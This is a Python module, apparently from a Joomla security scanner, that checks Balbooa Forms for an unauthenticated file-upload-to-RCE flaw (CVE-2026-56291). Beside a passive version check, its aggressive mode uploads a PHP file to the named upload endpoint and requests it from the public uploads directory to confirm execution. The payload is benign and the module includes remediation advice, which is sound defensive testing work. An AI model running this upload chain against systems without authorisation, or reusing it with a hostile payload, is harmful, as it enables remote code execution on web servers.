from __future__ import annotations

import urllib.parse

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import build_multipart, normalize_url, poll_paths, request
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str
from ...core.versions import version_lte

CVE_ID = "CVE-2026-56291"
NAME = "Balbooa Forms unauthenticated arbitrary file upload to RCE"
COMPONENT = "Balbooa Forms"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Balbooa Forms up to and including 2.4.0"
FIXED_RULE = "Balbooa Forms 2.4.1 or later"
UPLOAD_ENDPOINT = "/index.php?option=com_baforms&task=form.uploadAttachmentFile"
PUBLIC_UPLOAD_DIR = "/images/baforms/uploads/"


def affected_baforms(version: str | None) -> bool:
    return version_lte(version, "2.4.0")


def passive_result(plugins: dict | None) -> Finding:
    baforms = (plugins or {}).get("baforms", {})
    found = bool(baforms.get("found"))
    version = baforms.get("version")
    source = baforms.get("source") or "unknown"
    public_exec_blocked = "403-public-exec-blocked" in source

    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Balbooa Forms was not detected via uploads directory or component route.",
            action="Component not detected via standard public routes; verify manually if installed at another route.",
        )

    if public_exec_blocked and not version:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=(
                "Balbooa Forms appears present, but /images/baforms/uploads/ returned 403. "
                "Directory listing is blocked; direct file access still needs verification."
            ),
            action=f"Still verify Balbooa Forms version manually and update to {FIXED_RULE}.",
        )

    if not version:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"Balbooa Forms was detected at {source}, but its version could not be determined.",
            action=f"Manually verify Balbooa Forms version. Fixed version: {FIXED_RULE}.",
        )

    if affected_baforms(version):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=(
                f"Balbooa Forms {version} is at or below 2.4.0 and the public uploads route "
                + (
                    "directory listing returned 403, but direct uploaded file access still needs verification."
                    if public_exec_blocked
                    else "appears accessible."
                )
            ),
            action=f"Upgrade Balbooa Forms to {FIXED_RULE} and inspect uploads for unexpected PHP files.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="PATCHED",
        confidence="HIGH",
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=f"Balbooa Forms {version} is outside the affected range.",
        action=f"Keep Balbooa Forms at {FIXED_RULE}.",
    )


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    payload, expected_product = generate_php_math_payload()
    filename = f"jvh-baforms-{rand_str(8)}.php"
    content_type, body = build_multipart(
        {"title": "ProofCMS Lab Test"},
        {
            "file": (filename, payload, "application/x-php"),
            "files[]": (filename, payload, "application/x-php"),
            "attachment": (filename, payload, "application/x-php"),
            "jform[attachment]": (filename, payload, "application/x-php"),
        },
    )
    upload_url = f"{base}{UPLOAD_ENDPOINT}"
    upload = request(
        upload_url,
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
        proxy=proxy,
    )
    proof_candidates = [f"{PUBLIC_UPLOAD_DIR}{urllib.parse.quote(filename)}"]
    proof, found_path, attempts = poll_paths(
        lambda p: request(f"{base}{p}", timeout=timeout, proxy=proxy),
        proof_candidates,
        deadline=3.0,
        initial_delay=0.1,
    )
    proof_url = f"{base}{found_path}" if found_path else f"{base}{PUBLIC_UPLOAD_DIR}{urllib.parse.quote(filename)}"

    if proof and proof.get("status") == 200:
        body = proof.get("body", "")
        is_exec, is_source = verify_php_execution(body, expected_product)
        if is_exec:
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="VULNERABLE",
                confidence="CONFIRMED",
                component=COMPONENT,
                affected_rule=AFFECTED_RULE,
                exploit_available=HAS_EXPLOIT,
                exploit_ran=True,
                proof_url=proof_url,
                uploaded_filename=filename,
                detail=(
                    f"Aggressive lab upload succeeded and dynamic PHP proof ({expected_product}) executed from public uploads directory "
                    f"after {attempts} attempt(s). Upload response status: {upload.get('status')}."
                ),
                action=f"Delete {filename}, inspect for compromise, and upgrade Balbooa Forms to {FIXED_RULE}.",
            )
        if is_source or "<?php" in body.lower():
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="VULNERABLE_UPLOAD_ONLY",
                confidence="HIGH",
                component=COMPONENT,
                affected_rule=AFFECTED_RULE,
                exploit_available=HAS_EXPLOIT,
                exploit_ran=True,
                proof_url=proof_url,
                uploaded_filename=filename,
                detail=f"File write confirmed to uploads directory (verified in {attempts} attempt(s)), but PHP execution was not confirmed (source code served).",
                action=f"Delete {filename}, inspect for compromise, and upgrade Balbooa Forms to {FIXED_RULE}.",
            )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=proof_url,
        uploaded_filename=filename,
        detail=(
            "Aggressive lab upload probe did not confirm execution. "
            f"Upload status: {upload.get('status')}; proof status: {proof.get('status')}."
        ),
        action=(
            f"If the file was uploaded, delete {filename}. Verify server logs and upgrade Balbooa Forms to {FIXED_RULE}."
        ),
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires aggressive lab-only upload verification."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.2.0",
        "last_reviewed": "2026-03-20",
        "updated": "2026-03-20",
        "required_detectors": ["baforms"],
        "references": [
            "https://www.balbooa.com/joomla-forms",
        ],
    }
